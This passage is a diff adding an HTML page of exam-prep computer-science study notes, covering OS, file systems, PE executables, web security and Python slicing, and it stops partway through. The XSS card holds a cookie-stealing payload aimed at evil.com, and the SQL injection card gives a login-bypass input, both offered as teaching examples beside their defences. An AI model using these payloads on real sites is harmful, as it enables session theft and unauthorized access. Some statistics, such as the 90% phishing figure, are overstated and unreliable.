@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CS Study Notes — Exam Ready</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500&family=Lora:ital,wght@0,400;0,500;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d0f14;
+    --surface: #13161e;
+    --card: #1a1e28;
+    --border: #252a38;
+    --accent1: #f0c040;
+    --accent2: #4fc3f7;
+    --accent3: #a78bfa;
+    --accent4: #34d399;
+    --accent5: #f87171;
+    --text: #e8eaf0;
+    --muted: #8892a4;
+    --heading: #ffffff;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Lora', serif;
+    font-size: 15px;
+    line-height: 1.75;
+    min-height: 100vh;
+  }
+
+  /* NOISE TEXTURE OVERLAY */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* TOP HEADER */
+  .masthead {
+    position: relative;
+    padding: 60px 40px 40px;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+  .masthead::after {
+    content: '';
+    position: absolute;
+    top: -80px; right: -100px;
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(240,192,64,0.12) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .masthead-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent1);
+    margin-bottom: 12px;
+  }
+  .masthead h1 {
+    font-family: 'Syne', sans-serif;
+    font-size: clamp(28px, 5vw, 52px);
+    font-weight: 800;
+    color: var(--heading);
+    line-height: 1.1;
+    max-width: 700px;
+  }
+  .masthead h1 span { color: var(--accent1); }
+  .masthead-sub {
+    margin-top: 14px;
+    color: var(--muted);
+    font-size: 14px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  /* SEARCH + FILTER */
+  .controls {
+    padding: 24px 40px;
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+    position: sticky;
+    top: 0;
+    background: rgba(13,15,20,0.95);
+    backdrop-filter: blur(12px);
+    z-index: 100;
+  }
+  .search-box {
+    flex: 1;
+    min-width: 200px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 16px 10px 40px;
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    outline: none;
+    transition: border-color 0.2s;
+    position: relative;
+  }
+  .search-wrap { position: relative; flex: 1; min-width: 200px; }
+  .search-wrap svg { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); opacity: 0.4; }
+  .search-box:focus { border-color: var(--accent1); }
+  .filter-btn {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 9px 16px;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .filter-btn:hover, .filter-btn.active {
+    border-color: var(--accent1);
+    color: var(--accent1);
+    background: rgba(240,192,64,0.07);
+  }
+  .filter-btn[data-cat="os"].active { border-color: var(--accent2); color: var(--accent2); background: rgba(79,195,247,0.07); }
+  .filter-btn[data-cat="fs"].active { border-color: var(--accent4); color: var(--accent4); background: rgba(52,211,153,0.07); }
+  .filter-btn[data-cat="exe"].active { border-color: var(--accent3); color: var(--accent3); background: rgba(167,139,250,0.07); }
+  .filter-btn[data-cat="web"].active { border-color: var(--accent5); color: var(--accent5); background: rgba(248,113,113,0.07); }
+  .filter-btn[data-cat="py"].active { border-color: #60a5fa; color: #60a5fa; background: rgba(96,165,250,0.07); }
+  .filter-btn[data-cat="bc"].active { border-color: #f59e0b; color: #f59e0b; background: rgba(245,158,11,0.07); }
+  .filter-btn[data-cat="law"].active { border-color: #fb7185; color: #fb7185; background: rgba(251,113,133,0.07); }
+
+  /* CONTENT GRID */
+  .content {
+    padding: 40px;
+    max-width: 1400px;
+    margin: 0 auto;
+  }
+
+  .chapter {
+    margin-bottom: 52px;
+    animation: fadeUp 0.5s ease both;
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .chapter-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+  .chapter-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--muted);
+    min-width: 32px;
+  }
+  .chapter-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(to right, var(--border), transparent);
+  }
+  .chapter-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--heading);
+  }
+  .chapter-title .dot {
+    display: inline-block;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    margin-right: 10px;
+    vertical-align: middle;
+    position: relative;
+    top: -1px;
+  }
+
+  /* COLOR CODING PER CATEGORY */
+  .cat-os .dot { background: var(--accent2); box-shadow: 0 0 8px var(--accent2); }
+  .cat-fs .dot { background: var(--accent4); box-shadow: 0 0 8px var(--accent4); }
+  .cat-exe .dot { background: var(--accent3); box-shadow: 0 0 8px var(--accent3); }
+  .cat-cloud .dot { background: #38bdf8; box-shadow: 0 0 8px #38bdf8; }
+  .cat-web .dot { background: var(--accent5); box-shadow: 0 0 8px var(--accent5); }
+  .cat-py .dot { background: #60a5fa; box-shadow: 0 0 8px #60a5fa; }
+  .cat-bc .dot { background: var(--accent1); box-shadow: 0 0 8px var(--accent1); }
+  .cat-law .dot { background: #fb7185; box-shadow: 0 0 8px #fb7185; }
+
+  /* CARDS GRID */
+  .cards {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+    gap: 20px;
+  }
+
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
+    cursor: default;
+  }
+  .card:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 40px rgba(0,0,0,0.4);
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+  }
+  .cat-os .card::before  { background: linear-gradient(90deg, var(--accent2), transparent); }
+  .cat-fs .card::before  { background: linear-gradient(90deg, var(--accent4), transparent); }
+  .cat-exe .card::before { background: linear-gradient(90deg, var(--accent3), transparent); }
+  .cat-cloud .card::before { background: linear-gradient(90deg, #38bdf8, transparent); }
+  .cat-web .card::before { background: linear-gradient(90deg, var(--accent5), transparent); }
+  .cat-py .card::before  { background: linear-gradient(90deg, #60a5fa, transparent); }
+  .cat-bc .card::before  { background: linear-gradient(90deg, var(--accent1), transparent); }
+  .cat-law .card::before { background: linear-gradient(90deg, #fb7185, transparent); }
+
+  .card-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+  .cat-os .card-label  { color: var(--accent2); }
+  .cat-fs .card-label  { color: var(--accent4); }
+  .cat-exe .card-label { color: var(--accent3); }
+  .cat-cloud .card-label { color: #38bdf8; }
+  .cat-web .card-label { color: var(--accent5); }
+  .cat-py .card-label  { color: #60a5fa; }
+  .cat-bc .card-label  { color: var(--accent1); }
+  .cat-law .card-label { color: #fb7185; }
+
+  .card h3 {
+    font-family: 'Syne', sans-serif;
+    font-size: 17px;
+    font-weight: 700;
+    color: var(--heading);
+    margin-bottom: 12px;
+    line-height: 1.3;
+  }
+  .card p {
+    color: #c5cad8;
+    font-size: 14px;
+    line-height: 1.8;
+  }
+
+  /* KEY POINTS */
+  .keypoints {
+    margin-top: 14px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+  }
+  .kp {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    padding: 3px 8px;
+    border-radius: 4px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.08);
+    color: var(--muted);
+  }
+
+  /* MARKS BADGE */
+  .marks-badge {
+    position: absolute;
+    top: 20px; right: 20px;
+    background: rgba(240,192,64,0.12);
+    border: 1px solid rgba(240,192,64,0.25);
+    color: var(--accent1);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    padding: 3px 8px;
+    border-radius: 20px;
+  }
+
+  /* HIDDEN */
+  .chapter.hidden { display: none; }
+  .card.hidden { display: none; }
+
+  /* FOOTER */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 32px 40px;
+    text-align: center;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--muted);
+  }
+  footer span { color: var(--accent1); }
+
+  /* SCROLLBAR */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  @media (max-width: 640px) {
+    .masthead, .controls, .content { padding-left: 20px; padding-right: 20px; }
+    .cards { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<div class="masthead">
+  <div class="masthead-tag">📚 Exam Prep Notes · 5-Mark Questions</div>
+  <h1>CS Study <span>Notes</span></h1>
+  <div class="masthead-sub">// ~100–150 words per topic · exam-optimized · 2025</div>
+</div>
+
+<div class="controls">
+  <div class="search-wrap">
+    <svg width="14" height="14" fill="none" stroke="#8892a4" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+    <input class="search-box" type="text" id="searchInput" placeholder="Search topics…">
+  </div>
+  <button class="filter-btn active" data-cat="all">All</button>
+  <button class="filter-btn" data-cat="os">OS & Linux</button>
+  <button class="filter-btn" data-cat="fs">File System</button>
+  <button class="filter-btn" data-cat="exe">Executables</button>
+  <button class="filter-btn" data-cat="web">Web Security</button>
+  <button class="filter-btn" data-cat="py">Python</button>
+  <button class="filter-btn" data-cat="bc">Blockchain</button>
+  <button class="filter-btn" data-cat="law">Digital Laws</button>
+</div>
+
+<div class="content">
+
+  <!-- ====== OPERATING SYSTEM ====== -->
+  <div class="chapter cat-os" data-cat="os">
+    <div class="chapter-header">
+      <span class="chapter-num">01</span>
+      <h2 class="chapter-title"><span class="dot"></span>Operating System & Linux</h2>
+      <div class="chapter-line"></div>
+    </div>
+    <div class="cards">
+
+      <div class="card" data-topic="os architecture">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">OS Fundamentals</div>
+        <h3>OS Architecture</h3>
+        <p>An Operating System (OS) is system software that manages hardware and software resources. Its architecture has two core layers: the <strong>Kernel</strong> (core, runs in privileged mode) and the <strong>User Space</strong> (applications). The Kernel handles CPU scheduling, memory management, I/O, and process management. OS architectures include <em>Monolithic</em> (all services in kernel — fast but bulky, e.g., Linux), <em>Microkernel</em> (minimal kernel, services in user space — safer, e.g., Minix), and <em>Hybrid</em> (mix of both, e.g., Windows NT). The OS acts as an intermediary between the user and hardware, providing APIs and system calls for applications to request services securely.</p>
+        <div class="keypoints">
+          <span class="kp">Kernel</span><span class="kp">User Space</span><span class="kp">Monolithic</span><span class="kp">Microkernel</span><span class="kp">System Calls</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="os library shell commands">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">OS Fundamentals</div>
+        <h3>OS Libraries & Shell Commands</h3>
+        <p>OS <strong>libraries</strong> are pre-compiled code collections that programs use to perform common tasks (e.g., libc in Linux). They are of two types: <em>Static Libraries</em> (.lib, .a) — compiled into the executable, and <em>Dynamic/Shared Libraries</em> (.dll, .so) — loaded at runtime. <strong>Shell commands</strong> are text-based instructions passed to the OS shell (bash, zsh). Common Linux commands: <code>ls</code> (list files), <code>cd</code> (change directory), <code>chmod</code> (permissions), <code>ps</code> (processes), <code>grep</code> (search text), <code>kill</code> (terminate process). The shell interprets these commands and communicates with the kernel via system calls, bridging user intent and hardware execution.</p>
+        <div class="keypoints">
+          <span class="kp">libc</span><span class="kp">Static vs Dynamic</span><span class="kp">.dll/.so</span><span class="kp">Bash</span><span class="kp">System Calls</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="kernel responsibilities">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">OS Fundamentals</div>
+        <h3>Responsibilities of OS & Kernel</h3>
+        <p>The <strong>OS</strong> provides: process management, memory management, file system handling, I/O device control, security, and a user interface. The <strong>Kernel</strong> is the OS core that runs in privileged (Ring 0) mode and directly interacts with hardware. Key kernel responsibilities: <em>Process Scheduling</em> (CPU allocation using algorithms like Round Robin), <em>Virtual Memory</em> (paging, segmentation), <em>Interrupt Handling</em> (responds to hardware signals), <em>Device Drivers</em> (hardware abstraction), and <em>System Call Interface</em> (secure gateway for user programs to access kernel services). Without the kernel, no program can execute. It ensures isolation between processes to prevent crashes and unauthorized access.</p>
+        <div class="keypoints">
+          <span class="kp">Ring 0</span><span class="kp">Scheduling</span><span class="kp">Paging</span><span class="kp">Interrupts</span><span class="kp">Device Drivers</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="shell scripting">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">OS Fundamentals</div>
+        <h3>Shell Scripting</h3>
+        <p>Shell scripting is the practice of writing scripts (text files) containing a sequence of shell commands that are executed automatically. Scripts start with a <strong>shebang</strong> line: <code>#!/bin/bash</code>. Key features: <em>Variables</em> (<code>name="Alice"</code>), <em>Conditionals</em> (<code>if/else/fi</code>), <em>Loops</em> (<code>for</code>, <code>while</code>), <em>Functions</em>, and <em>Piping</em> (<code>|</code>) to chain commands. Shell scripts automate repetitive tasks like backups, deployments, and user management. They are interpreted line by line, making them slower than compiled programs but extremely powerful for system administration. Files must have execute permission (<code>chmod +x script.sh</code>) to run.</p>
+        <div class="keypoints">
+          <span class="kp">Shebang</span><span class="kp">Variables</span><span class="kp">Loops</span><span class="kp">Piping</span><span class="kp">chmod +x</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="linux history gnu">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Linux</div>
+        <h3>Linux — Origin, History & GNU</h3>
+        <p>Linux was created by <strong>Linus Torvalds</strong> in 1991 as a free, open-source Unix-like kernel. The <strong>GNU Project</strong>, started by Richard Stallman in 1983, aimed to create a completely free OS. GNU provided essential tools (compilers, editors, shells) but lacked a kernel. When Linux kernel was released, it combined with GNU tools to form <strong>GNU/Linux</strong> — a full operating system. Licensed under <strong>GPL (GNU General Public License)</strong>, any modification must remain open source. Today, Linux powers servers, Android, supercomputers, and embedded systems. Major distributions include Ubuntu, Fedora, Debian, and Arch Linux. Its open-source nature makes it highly customizable, secure, and community-driven.</p>
+        <div class="keypoints">
+          <span class="kp">Linus Torvalds</span><span class="kp">GNU/GPL</span><span class="kp">Stallman</span><span class="kp">Open Source</span><span class="kp">1991</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="linux file system">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Linux</div>
+        <h3>Linux File System Structure</h3>
+        <p>Linux uses a hierarchical file system starting at <strong>root (/)</strong>. Key directories: <code>/bin</code> (essential binaries), <code>/etc</code> (config files), <code>/home</code> (user directories), <code>/var</code> (variable data/logs), <code>/tmp</code> (temporary files), <code>/dev</code> (device files), <code>/proc</code> (virtual filesystem for processes), <code>/usr</code> (user programs), <code>/boot</code> (kernel and bootloader). Unlike Windows, Linux treats <em>everything as a file</em> — devices, processes, and sockets are represented as files. The default Linux filesystem is <strong>ext4</strong>, supporting journaling, large files, and fault recovery. The FHS (Filesystem Hierarchy Standard) defines these conventions uniformly across distributions.</p>
+        <div class="keypoints">
+          <span class="kp">/root</span><span class="kp">/etc</span><span class="kp">/dev</span><span class="kp">ext4</span><span class="kp">FHS</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="cli gui vs cli">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Linux</div>
+        <h3>GUI vs CLI</h3>
+        <p>A <strong>CLI (Command Line Interface)</strong> accepts text commands directly. A <strong>GUI (Graphical User Interface)</strong> uses windows, icons, and mouse interaction. <em>CLI advantages</em>: faster execution, scriptable, less memory usage, remote access via SSH, precise control. <em>GUI advantages</em>: user-friendly, visual feedback, lower learning curve, ideal for beginners. CLI is preferred in servers and cybersecurity (e.g., Kali Linux). GUI is used in desktop environments (GNOME, KDE). In Linux, both coexist — CLI through terminal emulators (bash), GUI through display servers (X11, Wayland). For power users and administrators, CLI is indispensable as it allows automation, remote management, and deep system access that GUI cannot easily replicate.</p>
+        <div class="keypoints">
+          <span class="kp">Terminal</span><span class="kp">SSH</span><span class="kp">GNOME</span><span class="kp">Bash</span><span class="kp">Automation</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ====== FILE SYSTEM ====== -->
+  <div class="chapter cat-fs" data-cat="fs">
+    <div class="chapter-header">
+      <span class="chapter-num">02</span>
+      <h2 class="chapter-title"><span class="dot"></span>File System</h2>
+      <div class="chapter-line"></div>
+    </div>
+    <div class="cards">
+
+      <div class="card" data-topic="ntfs fat fat32">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">File System</div>
+        <h3>NTFS, FAT & FAT32</h3>
+        <p><strong>FAT (File Allocation Table)</strong>: oldest, simple structure, 8.3 filename limit, no permissions, max 2GB file. <strong>FAT32</strong>: improved FAT, supports 4GB max file size, 32GB partition limit, widely compatible across OS (USB drives). <strong>NTFS (New Technology File System)</strong>: used in modern Windows. Supports large files (16EB), file permissions (ACLs), journaling (crash recovery), compression, and encryption (BitLocker). <em>Journaling</em> logs changes before writing, preventing corruption. NTFS uses <strong>MFT (Master File Table)</strong> to track all files. FAT32 is preferred for portability; NTFS for security and reliability. Linux can read NTFS via <code>ntfs-3g</code> driver. FAT has no security model — anyone can read/write.</p>
+        <div class="keypoints">
+          <span class="kp">FAT32</span><span class="kp">NTFS</span><span class="kp">MFT</span><span class="kp">Journaling</span><span class="kp">ACLs</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="file permissions octal">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">File System</div>
+        <h3>File Permissions & Octal Representation</h3>
+        <p>Linux file permissions control access for three entities: <strong>Owner, Group, Others</strong>. Each has three permissions: <em>Read (r=4)</em>, <em>Write (w=2)</em>, <em>Execute (x=1)</em>. Displayed as: <code>-rwxr-xr--</code>. Octal representation sums these values: <code>rwx = 7</code>, <code>r-x = 5</code>, <code>r-- = 4</code>. So <code>chmod 754</code> means owner=full, group=read+execute, others=read only. Special permissions: <em>SUID (4xxx)</em> runs file as owner, <em>SGID (2xxx)</em> inherits group, <em>Sticky bit (1xxx)</em> only owner can delete. Use <code>ls -l</code> to view permissions. Correct permission setting is critical for system security — misconfigured permissions can allow unauthorized access or privilege escalation.</p>
+        <div class="keypoints">
+          <span class="kp">rwx</span><span class="kp">chmod</span><span class="kp">SUID</span><span class="kp">Sticky Bit</span><span class="kp">ls -l</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ====== EXECUTABLES & VIRUSES ====== -->
+  <div class="chapter cat-exe" data-cat="exe">
+    <div class="chapter-header">
+      <span class="chapter-num">03</span>
+      <h2 class="chapter-title"><span class="dot"></span>Executables & Viruses</h2>
+      <div class="chapter-line"></div>
+    </div>
+    <div class="cards">
+
+      <div class="card" data-topic="pe file structure exe headers">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Executables</div>
+        <h3>Structure of a .exe PE File</h3>
+        <p>A Windows executable uses the <strong>PE (Portable Executable)</strong> format. Structure: <em>DOS Header</em> (starts with "MZ", legacy compatibility), <em>PE Header</em> (signature "PE\0\0", machine type, number of sections), <em>Optional Header</em> (entry point address, image base, subsystem), <em>Section Table</em> (directory of sections), and <em>Sections</em>: <code>.text</code> (executable code), <code>.data</code> (initialized variables), <code>.rdata</code> (read-only data/strings), <code>.bss</code> (uninitialized data), <code>.rsrc</code> (resources like icons), <code>.idata</code> (import table). The <strong>Import Address Table (IAT)</strong> lists required DLLs. Tools like PE Explorer or CFF Explorer allow analysis of PE files for reverse engineering and malware detection.</p>
+        <div class="keypoints">
+          <span class="kp">MZ Header</span><span class="kp">.text</span><span class="kp">.data</span><span class="kp">IAT</span><span class="kp">Entry Point</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="how exe loads">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Executables</div>
+        <h3>How an .exe Loads</h3>
+        <p>When an .exe is executed: 1) <strong>Windows Loader</strong> reads the PE header to determine memory requirements. 2) A <strong>Virtual Address Space</strong> is created for the process. 3) The file is <strong>mapped into memory</strong> at the preferred base address (or relocated if occupied). 4) The <strong>Import Table</strong> is resolved — required DLLs are loaded and function addresses written to the IAT. 5) <strong>TLS Callbacks</strong> (Thread Local Storage) execute if present. 6) Control passes to the <strong>Entry Point</strong> (usually <code>main()</code> or <code>WinMain()</code>). 7) The runtime initializes (C runtime, global constructors). 8) Program execution begins. Understanding this process is critical for malware analysis and debugging.</p>
+        <div class="keypoints">
+          <span class="kp">Windows Loader</span><span class="kp">Virtual Memory</span><span class="kp">DLL</span><span class="kp">IAT</span><span class="kp">Entry Point</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="virus hide exe">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Executables</div>
+        <h3>How a Virus Hides in an .exe</h3>
+        <p>Viruses use multiple techniques to hide inside executables: <em>Code Cave Injection</em> — virus code is inserted into unused padding between sections; <em>Section Appending</em> — a new malicious section is added; <em>Entry Point Modification</em> — the entry point is changed to run virus code first, then jump to original code (<strong>EPO</strong>). <em>Polymorphic Viruses</em> change their code on each infection to avoid signature detection. <em>Metamorphic Viruses</em> completely rewrite themselves. <em>Packers/Cryptors</em> compress/encrypt the payload, which decrypts at runtime — evading static analysis. <em>Import Table Manipulation</em> hides which APIs are called. Antivirus tools use heuristics, behavioral analysis, and sandboxing to detect these hidden threats.</p>
+        <div class="keypoints">
+          <span class="kp">Code Cave</span><span class="kp">EPO</span><span class="kp">Polymorphic</span><span class="kp">Packer</span><span class="kp">Cryptor</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="cloud computing virtualization">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Cloud & Virtualization</div>
+        <h3>Cloud Computing & Virtualization</h3>
+        <p><strong>Virtualization</strong> creates virtual instances of hardware, OS, or storage using a <strong>Hypervisor</strong>. Type 1 (bare-metal): runs directly on hardware (VMware ESXi, Hyper-V). Type 2: runs on a host OS (VirtualBox, VMware Workstation). <strong>Cloud Computing</strong> delivers computing services over the internet. Service models: <em>IaaS</em> (Infrastructure — raw VMs: AWS EC2), <em>PaaS</em> (Platform — dev environment: Heroku), <em>SaaS</em> (Software — apps: Gmail). Deployment: Public, Private, Hybrid. Benefits: scalability, cost efficiency, redundancy. <strong>Containers</strong> (Docker) are lighter than VMs — they share the host OS kernel but isolate application environments. Cloud security concerns: data breaches, misconfigured storage, and shared tenancy risks.</p>
+        <div class="keypoints">
+          <span class="kp">Hypervisor</span><span class="kp">IaaS/PaaS/SaaS</span><span class="kp">Docker</span><span class="kp">AWS</span><span class="kp">Containers</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ====== WEB SECURITY ====== -->
+  <div class="chapter cat-web" data-cat="web">
+    <div class="chapter-header">
+      <span class="chapter-num">04</span>
+      <h2 class="chapter-title"><span class="dot"></span>Web Security</h2>
+      <div class="chapter-line"></div>
+    </div>
+    <div class="cards">
+
+      <div class="card" data-topic="xss cross site scripting">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Web Security</div>
+        <h3>XSS — Cross-Site Scripting</h3>
+        <p><strong>XSS</strong> is a web vulnerability where an attacker injects malicious JavaScript into a webpage viewed by other users. Types: <em>Stored XSS</em> — script saved in database, executes for all viewers; <em>Reflected XSS</em> — script in URL, executes when link is clicked; <em>DOM-based XSS</em> — manipulates the DOM directly without server interaction. Impact: cookie theft, session hijacking, keylogging, phishing overlays. Example: <code>&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code>. <strong>Prevention</strong>: Output encoding (HTML encode user input), Content Security Policy (CSP) headers, input sanitization, using <code>HttpOnly</code> cookies to prevent JS access, and frameworks like React that auto-escape output. XSS is consistently in OWASP Top 10.</p>
+        <div class="keypoints">
+          <span class="kp">Stored XSS</span><span class="kp">Reflected</span><span class="kp">DOM-based</span><span class="kp">CSP</span><span class="kp">HttpOnly</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="phishing">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Web Security</div>
+        <h3>Phishing</h3>
+        <p><strong>Phishing</strong> is a social engineering attack where attackers impersonate trusted entities (banks, Google, PayPal) to trick users into revealing credentials, credit card numbers, or installing malware. Techniques: <em>Email Phishing</em> (fake emails with malicious links), <em>Spear Phishing</em> (targeted, personalized attacks), <em>Smishing</em> (SMS-based), <em>Vishing</em> (voice calls), <em>Clone Phishing</em> (copying legitimate emails). Attackers use look-alike domains (g00gle.com), SSL certificates to appear trusted, and urgency tactics. <strong>Prevention</strong>: Multi-Factor Authentication (MFA), email filtering, user education, checking URLs carefully, DMARC/SPF/DKIM email authentication, and anti-phishing browser extensions. Phishing causes 90% of data breaches globally.</p>
+        <div class="keypoints">
+          <span class="kp">Spear Phishing</span><span class="kp">MFA</span><span class="kp">DMARC</span><span class="kp">Social Engineering</span><span class="kp">Smishing</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="sql injection">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Web Security</div>
+        <h3>SQL Injection</h3>
+        <p><strong>SQL Injection (SQLi)</strong> occurs when user input is directly embedded in SQL queries without sanitization, allowing attackers to manipulate the database. Example: Input <code>' OR '1'='1</code> in login bypasses authentication. Types: <em>Classic</em> (direct data extraction), <em>Blind SQLi</em> (true/false responses reveal data), <em>Time-based Blind</em> (delays indicate truth), <em>Out-of-band</em> (exfiltration via DNS/HTTP). Attackers can dump databases, bypass login, delete data, or gain OS access. <strong>Prevention</strong>: Use <strong>Prepared Statements / Parameterized Queries</strong> (most effective), ORMs, input validation/whitelist, stored procedures, least privilege DB accounts, and WAF (Web Application Firewall). SQLi remains OWASP's #1 injection vulnerability.</p>
+        <div class="keypoints">
+          <span class="kp">Parameterized Query</span><span class="kp">Blind SQLi</span><span class="kp">WAF</span><span class="kp">ORM</span><span class="kp">Least Privilege</span>
+        </div>
+      </div>
+
+      <div class="card" data-topic="preventative measures url encode sanitization">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Web Security</div>
+        <h3>Preventative Measures — URL Encode & Sanitization</h3>
+        <p><strong>URL Encoding</strong> converts special characters into percent-encoded format so they are safely transmitted in URLs. Example: space → <code>%20</code>, <code>&lt;</code> → <code>%3C</code>. This prevents injection characters from being interpreted by browsers or servers. <strong>Input Sanitization</strong> removes or escapes dangerous characters from user input before processing. <strong>Output Encoding</strong> converts data to safe display format (HTML entities: <code>&lt;</code> → <code>&amp;lt;</code>). <strong>Validation</strong> ensures input matches expected format (email, number). Other measures: <em>Content Security Policy (CSP)</em> — restricts script sources; <em>HTTPS</em> — encrypts data in transit; <em>Rate Limiting</em> — prevents brute force; <em>CORS</em> — controls cross-origin access; <em>Prepared Statements</em> — prevents SQLi. Defense-in-depth layers multiple controls for robust security.</p>
+        <div class="keypoints">
+          <span class="kp">%20 Encoding</span><span class="kp">HTML Entities</span><span class="kp">CSP</span><span class="kp">CORS</span><span class="kp">HTTPS</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ====== PYTHON ====== -->
+  <div class="chapter cat-py" data-cat="py">
+    <div class="chapter-header">
+      <span class="chapter-num">05</span>
+      <h2 class="chapter-title"><span class="dot"></span>Python</h2>
+      <div class="chapter-line"></div>
+    </div>
+    <div class="cards">
+
+      <div class="card" data-topic="python joining splicing strings">
+        <div class="marks-badge">5 Marks</div>
+        <div class="card-label">Python</div>
+        <h3>Joining & Splicing in Python</h3>
+        <p>In Python, <strong>String Joining</strong> uses <code>str.join(iterable)</code> to concatenate elements of a list into a single string with a delimiter. Example: <code>", ".join(["a","b","c"])</code> → <code>"a, b, c"</code>. More efficient than <code>+</code> concatenation in loops. <strong>Splicing (Slicing)</strong> extracts portions of sequences (strings, lists) using <code>[start:stop:step]</code>. Example: <code>"Python"[1:4]</code> → <code>"yth"</code>; <code>"Hello"[::-1]</code> → <code>"olleH"</code> (reverse). Negative indexing counts from the end: <code>[-1]</code> = last element. Slicing is non-destructive — it returns a new object. These are essential for string manipulation, data parsing, and processing text in scripts, especially for security tasks like log parsing or data extraction.</p>
+        <div class="keypoints">
+          <span class="kp">.join()</span><span class="kp">[start:stop]</span><span class="kp">[::-1]</span><span class="kp">Negative Index</span><span class="kp">Slicing</span>
+        </div>
+      </div>
+
